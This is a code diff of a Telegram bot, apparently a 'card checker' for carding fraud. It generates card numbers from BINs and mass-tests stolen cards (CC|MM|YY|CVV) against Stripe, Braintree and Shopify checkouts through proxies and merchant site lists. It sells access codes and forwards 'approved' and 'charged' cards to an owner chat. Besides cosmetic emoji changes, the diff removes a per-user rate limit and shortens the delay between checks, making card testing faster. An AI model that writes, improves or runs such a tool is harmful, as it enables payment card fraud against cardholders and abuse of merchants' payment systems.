+                    [Button.inline("👤 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 💎", data="account"),
+                     Button.inline("ℹ️ 𝗛𝗲𝗹𝗽 📖", data="help_menu")],
+                    [Button.inline("🔍 𝗕𝗜𝗡 🧬", data="bin_search"),
+                     Button.inline("🎴 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿 🎲", data="card_gen")],
                 ])
                 if uid in ADMINS:
-                    btns.append([Button.inline(f"{E('⚙️')} 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 {E('👑')}", data="admin")])
+                    btns.append([Button.inline("⚙️ 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 👑", data="admin")])
                 await event.edit(header, buttons=btns, parse_mode='html')
 
         # ━━━━━━ TEXT COMMANDS ━━━━━━
@@ -3440,14 +3439,14 @@ class CardCheckerBot:
             count = int(event.pattern_match.group(1))
             bin_input = event.pattern_match.group(2) if event.pattern_match.group(2) else None
             if count > MAX_CARDS_PER_FILE_STRIPE:
-                await event.reply(f"{E('❌')} Max <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code>", parse_mode='html')
+                await event.reply(f"❌ Max <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code>", parse_mode='html')
                 return
             cards = self.generate_cards(count, bin_input)
             filepath = os.path.join(STORAGE_DIR, f"gen_{uid}_{uuid.uuid4().hex}.txt")
             with open(filepath, "w") as f:
                 f.write("\n".join(cards))
             await self.bot_client.send_file(event.chat_id, filepath,
-                                            caption=f"{E('🎴')} Generated <code>{len(cards):,}</code> cards",
+                                            caption=f"🎴 Generated <code>{len(cards):,}</code> cards",
                                             parse_mode='html')
             os.remove(filepath)
 
@@ -3459,7 +3458,7 @@ class CardCheckerBot:
             if not success:
                 await event.reply(
                     "╔══════════════════════════════╗\n"
-                    f"║      {E('❌')} INVALID CODE          ║\n"
+                    "║      ❌ INVALID CODE          ║\n"
                     "╚══════════════════════════════╝\n\n"
                     f"Code <code>{code}</code> not found or expired.",
                     parse_mode='html'
@@ -3473,9 +3472,9 @@ class CardCheckerBot:
             if code:
                 await event.reply(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('🎟️')} CODE GENERATED          ║\n"
+                    "║   🎟️ CODE GENERATED          ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"{E('🔑')} Code: <code>{code}</code>\n"
+                    f"🔑 Code: <code>{code}</code>\n"
                     "🔰 Type: <code>Global Access</code>",
                     parse_mode='html'
                 )
@@ -3488,9 +3487,9 @@ class CardCheckerBot:
             if code:
                 await event.reply(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('🎟️')} CODE GENERATED          ║\n"
+                    "║   🎟️ CODE GENERATED          ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"{E('🔑')} Code: <code>{code}</code>\n"
+                    f"🔑 Code: <code>{code}</code>\n"
                     "🔰 Type: <code>Shopify Access</code>",
                     parse_mode='html'
                 )
@@ -3503,12 +3502,12 @@ class CardCheckerBot:
             count = int(event.pattern_match.group(1))
             duration = event.pattern_match.group(2).strip()
             if count < 1 or count > 50:
-                await event.reply(f"{E('❌')} Count must be between 1 and 50.", parse_mode='html')
+                await event.reply("❌ Count must be between 1 and 50.", parse_mode='html')
                 return
             valid_durations = ["1m", "1h", "1d", "1w", "1month", "perm"]
             if duration.lower() not in valid_durations:
                 await event.reply(
-                    f"{E('❌')} Invalid duration. Use one of:\n"
+                    "❌ Invalid duration. Use one of:\n"
                     f"<code>{', '.join(valid_durations)}</code>",
                     parse_mode='html'
                 )
@@ -3519,19 +3518,19 @@ class CardCheckerBot:
                 if code:
                     codes.append(code)
             if not codes:
-                await event.reply(f"{E('❌')} Failed to generate codes.", parse_mode='html')
+                await event.reply("❌ Failed to generate codes.", parse_mode='html')
                 return
             # Format the codes list
             dur_display = duration.lower()
             codes_text = "\n".join(f"<code>{c}</code>" for c in codes)
             msg = (
                 "╔══════════════════════════════════╗\n"
-                f"║  {E('🎟️')} MASS CODES GENERATED         ║\n"
+                "║  🎟️ MASS CODES GENERATED         ║\n"
                 "╚══════════════════════════════════╝\n\n"
-                f"{E('📊')} Count: <b>{len(codes)}</b>\n"
-                f"{E('⏳')} Duration: <b>{dur_display}</b>\n"
+                f"📊 Count: <b>{len(codes)}</b>\n"
+                f"⏳ Duration: <b>{dur_display}</b>\n"
                 f"🔰 Type: <b>Shopify Access</b>\n\n"
-                f"{E('🔑')} Codes:\n{codes_text}\n\n"
+                f"🔑 Codes:\n{codes_text}\n\n"
                 f"💡 Users redeem with: <code>/redeem CODE</code>"
             )
             # If message is too long, send as file
@@ -3544,7 +3543,7 @@ class CardCheckerBot:
                     for c in codes:
                         f.write(f"{c}\n")
                 await event.reply(
-                    f"{E('🎟️')} Generated {len(codes)} Shopify codes ({dur_display}).\n"
+                    f"🎟️ Generated {len(codes)} Shopify codes ({dur_display}).\n"
                     "📎 Codes attached as file:",
                     file=file_path,
                     parse_mode='html'
@@ -3578,13 +3577,13 @@ class CardCheckerBot:
                 self.save_users()
                 await event.reply(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('❌')} ACCESS REVOKED           ║\n"
+                    "║   ❌ ACCESS REVOKED           ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"{E('🔒')} User <code>{target}</code> Shopify removed",
+                    f"🔒 User <code>{target}</code> Shopify removed",
                     parse_mode='html'
                 )
             else:
-                await event.reply(f"{E('❌')} User <code>{target}</code> not found", parse_mode='html')
+                await event.reply(f"❌ User <code>{target}</code> not found", parse_mode='html')
 
         # ━━━━━━ /test_sites — API-based site validator (admin only) ━━━━━━
         @self.bot_client.on(events.NewMessage(pattern=r'/test_sites'))
@@ -3593,12 +3592,12 @@ class CardCheckerBot:
                 return
             sites = list(self.owner_sites) if self.owner_sites else []
             if not sites:
-                await event.reply(f"{E('❌')} No sites loaded. Upload sites first.")
+                await event.reply("❌ No sites loaded. Upload sites first.")
                 return
             status_msg = await event.reply(
-                f"{E('🔍')} Testing {len(sites)} sites via Flask API...\n"
-                f"{E('⏳')} This may take a while ({SHOPIFY_TEST_SITE_TIMEOUT}s timeout per site, retry enabled).\n"
-                f"{E('📋')} Strict mode: site must return real payment response (CARD_DECLINED etc.).",
+                f"🔍 Testing {len(sites)} sites via Flask API...\n"
+                f"⏳ This may take a while ({SHOPIFY_TEST_SITE_TIMEOUT}s timeout per site, retry enabled).\n"
+                f"📋 Strict mode: site must return real payment response (CARD_DECLINED etc.).",
                 parse_mode='html'
             )
             try:
@@ -3611,20 +3610,20 @@ class CardCheckerBot:
                     self.site_index = 0
                     self.dead_sites = set()
                     loaded = len(self.working_sites)
-                    fallback_msg = f"\n{E('⚠️')} No tested sites passed — using ALL owner sites as fallback."
+                    fallback_msg = "\n⚠️ No tested sites passed — using ALL owner sites as fallback."
                 await status_msg.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('🔍')} SITE TEST COMPLETE       ║\n"
+                    "║   🔍 SITE TEST COMPLETE       ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"{E('✅')} Working: <code>{len(working)}</code> (strict: real payment response verified)\n"
-                    f"{E('❌')} Dead: <code>{len(dead)}</code>\n"
-                    f"{E('📦')} Loaded: <code>{loaded}</code> sites activated\n\n"
-                    f"{E('📝')} Saved to <code>working_sites_api.txt</code>{fallback_msg}\n"
-                    f"{E('📋')} Check bot logs for per-site failure details.",
+                    f"✅ Working: <code>{len(working)}</code> (strict: real payment response verified)\n"
+                    f"❌ Dead: <code>{len(dead)}</code>\n"
+                    f"📦 Loaded: <code>{loaded}</code> sites activated\n\n"
+                    f"📝 Saved to <code>working_sites_api.txt</code>{fallback_msg}\n"
+                    "📋 Check bot logs for per-site failure details.",
                     parse_mode='html'
                 )
             except Exception as e:
-                await status_msg.edit(f"{E('❌')} Error testing sites: <code>{str(e)[:100]}</code>", parse_mode='html')
+                await status_msg.edit(f"❌ Error testing sites: <code>{str(e)[:100]}</code>", parse_mode='html')
 
         # ━━━━━━ /load_working_sites — Load tested working sites (admin only) ━━━━━━
         @self.bot_client.on(events.NewMessage(pattern=r'/load_working_sites'))
@@ -3634,13 +3633,13 @@ class CardCheckerBot:
             count = self.load_working_sites_from_file()
             if count > 0:
                 await event.reply(
-                    f"{E('✅')} Loaded <code>{count}</code> working sites\n"
-                    f"{E('🔄')} Active site list replaced.",
+                    f"✅ Loaded <code>{count}</code> working sites\n"
+                    "🔄 Active site list replaced.",
                     parse_mode='html'
                 )
             else:
                 await event.reply(
-                    f"{E('❌')} No working sites file found or file is empty.\n"
+                    "❌ No working sites file found or file is empty.\n"
                     "Run <code>/test_sites</code> first.",
                     parse_mode='html'
                 )
@@ -3650,13 +3649,13 @@ class CardCheckerBot:
         async def single_stripe(event):
             uid = event.sender_id
             if not self.is_user_approved(uid):
-                await event.reply(f"{E('🔒')} Access Denied.")
+                await event.reply("🔒 Access Denied.")
                 return
             args = (event.pattern_match.group(1) or "").strip()
             if not args:
-                await event.reply(f"{E('❌')} <code>/st CC|MM|YY|CVV</code>", parse_mode='html')
+                await event.reply("❌ <code>/st CC|MM|YY|CVV</code>", parse_mode='html')
                 return
-            status = await event.reply(f"{E('💀')} <code>ʜᴜɴᴛɪɴɢ ᴠɪᴀ Stripe...</code> {E('⚡')}", parse_mode='html')
+            status = await event.reply("💀 <code>ʜᴜɴᴛɪɴɢ ᴠɪᴀ Stripe...</code> ⚡", parse_mode='html')
             raw = await self.send_card_to_payu(args, gateway='stripe')
             self.stats["total_checked"] += 1
             self.update_user_stats(uid, checked=1)
@@ -3669,13 +3668,13 @@ class CardCheckerBot:
                 parts = args.split('|')
                 await status.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('❌')} 𝗦𝗧𝗥𝗜𝗣𝗘 ─ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 {E('💀')}            ║\n"
+                    "║  ❌ 𝗦𝗧𝗥𝗜𝗣𝗘 ─ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 💀            ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"┃ {E('💳')} <code>{args}</code>\n"
-                    f"┃ {E('🔢')} BIN: <code>{parts[0][:6]}</code>\n"
+                    f"┃ 💳 <code>{args}</code>\n"
+                    f"┃ 🔢 BIN: <code>{parts[0][:6]}</code>\n"
                     f"┃ 🚫 <code>{raw[:80]}</code>\n"
                     f"┃ ⏰ <code>{datetime.now().strftime('%H:%M:%S')}</code>\n\n"
-                    f"{E('🔴')} <b>Status:</b> <code>DECLINED</code> {E('❌')} — ᴅᴇᴀᴅ ᴄᴀʀᴅ {E('💀')}",
+                    "🔴 <b>Status:</b> <code>DECLINED</code> ❌ — ᴅᴇᴀᴅ ᴄᴀʀᴅ 💀",
                     parse_mode='html'
                 )
 
@@ -3683,13 +3682,13 @@ class CardCheckerBot:
         async def single_bt(event):
             uid = event.sender_id
             if not self.is_user_approved(uid):
-                await event.reply(f"{E('🔒')} Access Denied.")
+                await event.reply("🔒 Access Denied.")
                 return
             args = (event.pattern_match.group(1) or "").strip()
             if not args:
-                await event.reply(f"{E('❌')} <code>/bt CC|MM|YY|CVV</code>", parse_mode='html')
+                await event.reply("❌ <code>/bt CC|MM|YY|CVV</code>", parse_mode='html')
                 return
-            status = await event.reply(f"{E('💀')} <code>ʜᴜɴᴛɪɴɢ ᴠɪᴀ Braintree...</code> {E('🌐')}", parse_mode='html')
+            status = await event.reply("💀 <code>ʜᴜɴᴛɪɴɢ ᴠɪᴀ Braintree...</code> 🌐", parse_mode='html')
             raw = await self.send_card_to_payu(args, gateway='braintree')
             self.stats["total_checked"] += 1
             self.update_user_stats(uid, checked=1)
@@ -3702,13 +3701,13 @@ class CardCheckerBot:
                 parts = args.split('|')
                 await status.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('❌')} 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 ─ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 {E('💀')}        ║\n"
+                    "║  ❌ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 ─ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 💀        ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"┃ {E('💳')} <code>{args}</code>\n"
-                    f"┃ {E('🔢')} BIN: <code>{parts[0][:6]}</code>\n"
+                    f"┃ 💳 <code>{args}</code>\n"
+                    f"┃ 🔢 BIN: <code>{parts[0][:6]}</code>\n"
                     f"┃ 🚫 <code>{raw[:80]}</code>\n"
                     f"┃ ⏰ <code>{datetime.now().strftime('%H:%M:%S')}</code>\n\n"
-                    f"{E('🔴')} <b>Status:</b> <code>DECLINED</code> {E('❌')} — ᴅᴇᴀᴅ ᴄᴀʀᴅ {E('💀')}",
+                    "🔴 <b>Status:</b> <code>DECLINED</code> ❌ — ᴅᴇᴀᴅ ᴄᴀʀᴅ 💀",
                     parse_mode='html'
                 )
 
@@ -3717,17 +3716,16 @@ class CardCheckerBot:
         async def single_shopify(event):
             uid = event.sender_id
             if not self.is_shopify_approved(uid):
-                await event.reply(f"{E('🔒')} Shopify Access Denied.")
+                await event.reply("🔒 Shopify Access Denied.")
                 return
-            await self._rate_limit_user()
             args = event.pattern_match.group(1).strip()
             if not args:
-                await event.reply(f"{E('❌')} <code>/sp CC|MM|YY|CVV</code> or <code>/sp CC|MM|YY|CVV proxy</code> or <code>/sp CC|MM|YY|CVV low</code>", parse_mode='html')
+                await event.reply("❌ <code>/sp CC|MM|YY|CVV</code> or <code>/sp CC|MM|YY|CVV proxy</code> or <code>/sp CC|MM|YY|CVV low</code>", parse_mode='html')
                 return
             parts = args.split()
             card = parts[0]
             if not re.match(r"^\d{13,19}\|\d{2}\|\d{2,4}\|\d{3,4}$", card):
-                await event.reply(f"{E('❌')} Invalid format. <code>CC|MM|YY|CVV</code>", parse_mode='html')
+                await event.reply("❌ Invalid format. <code>CC|MM|YY|CVV</code>", parse_mode='html')
                 return
 
             mode = "direct"
@@ -3744,7 +3742,7 @@ class CardCheckerBot:
                 amount_filter = self.user_amount_filter.get(uid, "all")
 
             status = await event.reply(
-                f"{E('💀')} <code>⟦ ꜱʜᴏᴘɪꜰʏ ʀᴇʟᴏᴀᴅᴇᴅ V2 ᴇɴɢɪɴᴇ ꜰɪʀɪɴɢ ᴜᴘ... ⟧</code> {E('☠️')}",
+                "💀 <code>⟦ ꜱʜᴏᴘɪꜰʏ ʀᴇʟᴏᴀᴅᴇᴅ V2 ᴇɴɢɪɴᴇ ꜰɪʀɪɴɢ ᴜᴘ... ⟧</code> ☠️",
                 parse_mode='html'
             )
             approved = False
@@ -3759,7 +3757,7 @@ class CardCheckerBot:
                 else:
                     proxies = self.user_proxies.get(uid, [])
                     if not proxies:
-                        await status.edit(f"{E('❌')} No proxies. Upload first!", parse_mode='html')
+                        await status.edit("❌ No proxies. Upload first!", parse_mode='html')
                         return
                     proxy = await self.get_next_proxy_async(uid)
                     raw, approved, final_info = await self.shopify_check_card(
@@ -3794,18 +3792,18 @@ class CardCheckerBot:
             try:
                 content = await self.bot_client.download_file(doc, bytes)
             except Exception as e:
-                await event.reply(f"{E('❌')} Download failed: {e}")
+                await event.reply(f"❌ Download failed: {e}")
                 return
 
             if mode == 'shopify_proxies':
                 if not self.is_shopify_approved(uid) and uid not in ADMINS:
-                    await event.reply(f"{E('🔒')} Shopify access required.")
+                    await event.reply("🔒 Shopify access required.")
                     return
                 proxies = [l.strip() for l in content.decode(errors='ignore').splitlines() if l.strip()]
                 if not proxies:
-                    await event.reply(f"{E('❌')} No proxies in file.")
+                    await event.reply("❌ No proxies in file.")
                     return
-                msg = await event.reply(f"{E('⏳')} <code>Validating proxies...</code>", parse_mode='html')
+                msg = await event.reply("⏳ <code>Validating proxies...</code>", parse_mode='html')
                 valid = await self.validate_proxies_batch(proxies, user_id=uid)
                 self.user_proxies[uid] = valid
                 self.proxy_index[uid] = 0
@@ -3813,69 +3811,69 @@ class CardCheckerBot:
                     "╔══════════════════════════════╗\n"
                     "║   📎 PROXIES LOADED          ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    f"┃ {E('🟢')} Working: <code>{len(valid)}</code>\n"
-                    f"┃ {E('🔴')} Dead:    <code>{len(proxies) - len(valid)}</code>\n"
-                    f"┃ {E('📊')} Total:   <code>{len(valid)}</code>",
+                    f"┃ 🟢 Working: <code>{len(valid)}</code>\n"
+                    f"┃ 🔴 Dead:    <code>{len(proxies) - len(valid)}</code>\n"
+                    f"┃ 📊 Total:   <code>{len(valid)}</code>",
                     parse_mode='html'
                 )
                 return
 
             if mode == 'owner_sites':
                 if uid not in ADMINS:
-                    await event.reply(f"{E('🔒')} Admin only.")
+                    await event.reply("🔒 Admin only.")
                     return
                 sites = [l.strip() for l in content.decode(errors='ignore').splitlines()
                          if l.strip() and not l.startswith("#")]
                 if not sites:
-                    await event.reply(f"{E('❌')} No valid sites.")
+                    await event.reply("❌ No valid sites.")
                     return
                 original_count = len(sites)
                 self.save_owner_sites(sites)  # internally caps at MAX_OWNER_SITES
                 capped = len(self.owner_sites)
-                cap_note = f"\n┃ {E('⚠️')} <b>Capped to:</b> <code>{MAX_OWNER_SITES}</code> (was {original_count})" if original_count > MAX_OWNER_SITES else ""
+                cap_note = f"\n┃ ⚠️ <b>Capped to:</b> <code>{MAX_OWNER_SITES}</code> (was {original_count})" if original_count > MAX_OWNER_SITES else ""
                 # Trust all sites as working — no validation
                 self.working_sites = list(self.owner_sites)
                 self.dead_sites = set()
                 self._sites_ready = True
                 await event.reply(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('📂')} 𝗦𝗜𝗧𝗘𝗦 𝗟𝗢𝗔𝗗𝗘𝗗 {E('⚡')}                 ║\n"
+                    "║  📂 𝗦𝗜𝗧𝗘𝗦 𝗟𝗢𝗔𝗗𝗘𝗗 ⚡                 ║\n"
                     "╠══════════════════════════════════════╣\n\n"
-                    f"┃ {E('📋')} <b>Total:</b>     <code>{capped}</code>{cap_note}\n"
-                    f"┃ {E('🟢')} <b>Working:</b>   <code>{capped}</code> (all trusted {E('✅')})\n"
-                    f"┃ {E('🔴')} <b>Dead:</b>      <code>0</code>\n\n"
-                    f"{E('💎')} <i>All sites loaded and ready to use</i>",
+                    f"┃ 📋 <b>Total:</b>     <code>{capped}</code>{cap_note}\n"
+                    f"┃ 🟢 <b>Working:</b>   <code>{capped}</code> (all trusted ✅)\n"
+                    f"┃ 🔴 <b>Dead:</b>      <code>0</code>\n\n"
+                    "💎 <i>All sites loaded and ready to use</i>",
                     parse_mode='html'
                 )
                 return
 
             elif mode == 'shopify':
                 if not self.is_shopify_approved(uid) and uid not in ADMINS:
-                    await event.reply(f"{E('🔒')} Shopify access required.")
+                    await event.reply("🔒 Shopify access required.")
                     return
-                max_cards, gateway, prefix = MAX_CARDS_PER_FILE_SHOPIFY, 'shopify', f"{E('🛒')} Shopify"
+                max_cards, gateway, prefix = MAX_CARDS_PER_FILE_SHOPIFY, 'shopify', "🛒 Shopify"
             elif mode == 'stripe':
                 if not self.is_user_approved(uid):
-                    await event.reply(f"{E('🔒')} Access required.")
+                    await event.reply("🔒 Access required.")
                     return
-                max_cards, gateway, prefix = MAX_CARDS_PER_FILE_STRIPE, 'stripe', f"{E('⚡')} Stripe"
+                max_cards, gateway, prefix = MAX_CARDS_PER_FILE_STRIPE, 'stripe', "⚡ Stripe"
             elif mode == 'braintree':
                 if not self.is_user_approved(uid):
-                    await event.reply(f"{E('🔒')} Access required.")
+                    await event.reply("🔒 Access required.")
                     return
-                max_cards, gateway, prefix = MAX_CARDS_PER_FILE_BRAINTREE, 'braintree', f"{E('🌐')} Braintree"
+                max_cards, gateway, prefix = MAX_CARDS_PER_FILE_BRAINTREE, 'braintree', "🌐 Braintree"
             else:
                 return
 
             if any(job['user_id'] == uid for job in self.active_jobs.values()):
-                await event.reply(f"{E('❌')} You already have an active job.")
+                await event.reply("❌ You already have an active job.")
                 return
 
             filepath = self.save_cards_file(content, uid, event.chat_id)
             valid, cnt, err = self.validate_cards_file(filepath, max_cards)
             if not valid:
                 os.remove(filepath)
-                await event.reply(f"{E('❌')} {err}")
+                await event.reply(f"❌ {err}")
                 return
 
             # FIX: Validate price cache before starting a filtered Shopify mass job
@@ -3887,9 +3885,9 @@ class CardCheckerBot:
                     if uncached:
                         os.remove(filepath)
                         await event.reply(
-                            f"{E('⚠️')} <b>Price cache incomplete</b> — {len(uncached)}/{len(base_sites)} sites missing prices.\n\n"
+                            f"⚠️ <b>Price cache incomplete</b> — {len(uncached)}/{len(base_sites)} sites missing prices.\n\n"
                             "Run <code>/test_sites</code> first to populate site prices, then try again.\n"
-                            f"Or set filter to <b>{E('🌐')} All</b> to skip price filtering.",
+                            "Or set filter to <b>🌐 All</b> to skip price filtering.",
                             parse_mode='html'
                         )
                         return
@@ -3908,9 +3906,9 @@ class CardCheckerBot:
                 f"║   {prefix} MASS CHECK         ║\n"
                 "╚══════════════════════════════╝\n\n"
                 f"    {self.progress_bar(0, cnt)}\n\n"
-                f"┃ {E('📃')} Cards: <code>{cnt:,}</code>\n"
-                f"┃ {E('⚡')} Speed: <code>{speed_str} cards/sec</code>",
-                buttons=Button.inline(f"⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 {E('🛑')}", data=f"stop_{job_id}"),
+                f"┃ 📃 Cards: <code>{cnt:,}</code>\n"
+                f"┃ ⚡ Speed: <code>{speed_str} cards/sec</code>",
+                buttons=Button.inline("⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 🛑", data=f"stop_{job_id}"),
                 parse_mode='html'
             )
             self.active_jobs[job_id]['message_id'] = msg.id
@@ -3937,12 +3935,12 @@ class CardCheckerBot:
                 gateway = job['gateway']
 
                 if gateway in ['stripe', 'braintree'] and not self.is_user_approved(user_id):
-                    await self.safe_send_message(chat_id, f"{E('🔒')} No access. Job cancelled.")
+                    await self.safe_send_message(chat_id, "🔒 No access. Job cancelled.")
                     self.active_jobs.pop(job_id, None)
                     continue
 
                 if gateway == 'shopify' and not self.is_shopify_approved(user_id):
-                    await self.safe_send_message(chat_id, f"{E('🔒')} No Shopify access. Job cancelled.")
+                    await self.safe_send_message(chat_id, "🔒 No Shopify access. Job cancelled.")
                     self.active_jobs.pop(job_id, None)
                     continue
 
@@ -3951,7 +3949,7 @@ class CardCheckerBot:
 
                 total = len(cards)
                 if total == 0:
-                    await self.safe_send_message(chat_id, f"{E('❌')} No valid cards found.")
+                    await self.safe_send_message(chat_id, "❌ No valid cards found.")
                     self.active_jobs.pop(job_id, None)
                     continue
 
@@ -3962,7 +3960,7 @@ class CardCheckerBot:
 
                 msg = await self.safe_send_message(
                     chat_id,
-                    f"{E('⏳')} <code>Starting {gateway.upper()} mass check... ({total:,} cards)</code>",
+                    f"⏳ <code>Starting {gateway.upper()} mass check... ({total:,} cards)</code>",
                 )
                 job['message_id'] = msg.id
                 no_progress_deadline = time.time() + JOB_NO_PROGRESS_TIMEOUT
@@ -4037,7 +4035,7 @@ class CardCheckerBot:
                             if self._api_unavailable:
                                 logger.warning(f"[worker] ⏸ API unavailable — pausing 60s for card {card[:6]}...")
                                 await asyncio.sleep(60)
-                            await asyncio.sleep(0.6)
+                            await asyncio.sleep(0.2)
                             proxy = await self.get_next_proxy_async(user_id)
                             # FIX: Pass user's selected amount filter instead of hardcoded "all"
                             user_filter = self.user_amount_filter.get(user_id, "all")
@@ -4059,7 +4057,7 @@ class CardCheckerBot:
                             # Warn if cards are completing suspiciously fast (not reaching payment step)
                             if card_elapsed < FAST_FAIL_THRESHOLD_SECS and raw != "No sites":
                                 logger.warning(
-                                    f"[worker] {E('⚠️')} FAST-FAIL: Card completed in {card_elapsed:.2f}s — "
+                                    f"[worker] ⚠️ FAST-FAIL: Card completed in {card_elapsed:.2f}s — "
                                     f"checkout likely not reaching payment step. site={info.get('site', 'n/a')}"
                                 )
                             if ok:
@@ -4151,13 +4149,13 @@ class CardCheckerBot:
                     ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                     if gateway == 'stripe':
                         user_file = os.path.join(PROCESSED_DIR, f"approved_{user_id}_{ts}.txt")
-                        cap = f"{E('✅')} Stripe Approved"
+                        cap = "✅ Stripe Approved"
                     elif gateway == 'braintree':
                         user_file = os.path.join(PROCESSED_DIR, f"bt_approved_{user_id}_{ts}.txt")
                         cap = "�� Braintree Approved"
                     else:
                         user_file = os.path.join(PROCESSED_DIR, f"shopify_approved_{user_id}_{ts}.txt")
-                        cap = f"{E('✅')} Shopify Approved"
+                        cap = "✅ Shopify Approved"
 
                     with open(user_file, "w") as f:
                         f.write("\n".join(approved_cards))
@@ -4169,16 +4167,16 @@ class CardCheckerBot:
 
                     summary = (
                         "╔══════════════════════════════╗\n"
-                        f"║   {E('✅')} JOB COMPLETED            ║\n"
+                        "║   ✅ JOB COMPLETED            ║\n"
                         "╚══════════════════════════════╝\n\n"
-                        f"┏━━━━━ {E('📊')} Results ━━━━━━━━━━┓\n"
-                        f"┃ {E('📃')} Total:    <code>{total:,}</code>\n"
-                        f"┃ {E('✅')} Hits:     <code>{len(approved_cards):,}</code>\n"
+                        "┏━━━━━ 📊 Results ━━━━━━━━━━┓\n"
+                        f"┃ 📃 Total:    <code>{total:,}</code>\n"
+                        f"┃ ✅ Hits:     <code>{len(approved_cards):,}</code>\n"
                     )
                     if charged_cards:
-                        summary += f"┃ {E('💰')} Charged:  <code>{len(charged_cards):,}</code>\n"
+                        summary += f"┃ 💰 Charged:  <code>{len(charged_cards):,}</code>\n"
                     if gateway == 'shopify':
-                        summary += f"┃ {E('❌')} Declined: <code>{declined_count:,}</code>\n"
+                        summary += f"┃ ❌ Declined: <code>{declined_count:,}</code>\n"
                     summary += (
                         f"┃ 📈 Rate:     <code>[{rate_bar}] {rate:.1f}%</code>\n"
                         "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
@@ -4199,7 +4197,7 @@ class CardCheckerBot:
 
                     await self.bot_client.send_file(
                         FORWARD_CHAT_ID, owner_file,
-                        caption=f"{E('📊')} {gateway.upper()} | {user_link} | {E('✅')} {len(approved_cards)} hits",
+                        caption=f"📊 {gateway.upper()} | {user_link} | ✅ {len(approved_cards)} hits",
                         parse_mode='html'
                     )
                     os.remove(owner_file)
@@ -4213,24 +4211,24 @@ class CardCheckerBot:
                                 f.write(f"{c}\n")
                         await self.bot_client.send_file(
                             FORWARD_CHAT_ID, cf,
-                            caption=f"{E('💰')} {gateway.upper()} CHARGED | {user_link} | {len(charged_cards)} cards",
+                            caption=f"💰 {gateway.upper()} CHARGED | {user_link} | {len(charged_cards)} cards",
                             parse_mode='html'
                         )
                         os.remove(cf)
                 else:
                     summary = (
                         "╔══════════════════════════════╗\n"
-                        f"║   {E('✅')} JOB COMPLETED            ║\n"
+                        "║   ✅ JOB COMPLETED            ║\n"
                         "╚══════════════════════════════╝\n\n"
-                        f"┃ {E('📃')} Total: <code>{total:,}</code>\n"
-                        f"┃ {E('❌')} Hits:  <code>0</code>\n"
+                        f"┃ 📃 Total: <code>{total:,}</code>\n"
+                        f"┃ ❌ Hits:  <code>0</code>\n"
                     )
                     if gateway == 'shopify':
                         summary += f"┃ 🚫 Declined: <code>{declined_count:,}</code>\n"
                     summary += "┃ 📈 Rate: <code>0%</code>"
                     await self.safe_send_message(chat_id, summary)
                     await self.safe_send_message(FORWARD_CHAT_ID,
-                        f"{E('📊')} {gateway.upper()} done | {user_link} | {E('❌')} No hits")
+                        f"📊 {gateway.upper()} done | {user_link} | ❌ No hits")
 
                 try:
                     os.rename(filepath, os.path.join(PROCESSED_DIR, os.path.basename(filepath)))
@@ -4241,7 +4239,7 @@ class CardCheckerBot:
                 logger.exception(f"Worker {wid} error: {e}")
                 if chat_id:
                     try:
-                        await self.safe_send_message(chat_id, f"{E('❌')} Error: <code>{str(e)[:100]}</code>")
+                        await self.safe_send_message(chat_id, f"❌ Error: <code>{str(e)[:100]}</code>")
                     except:
                         pass
             finally:
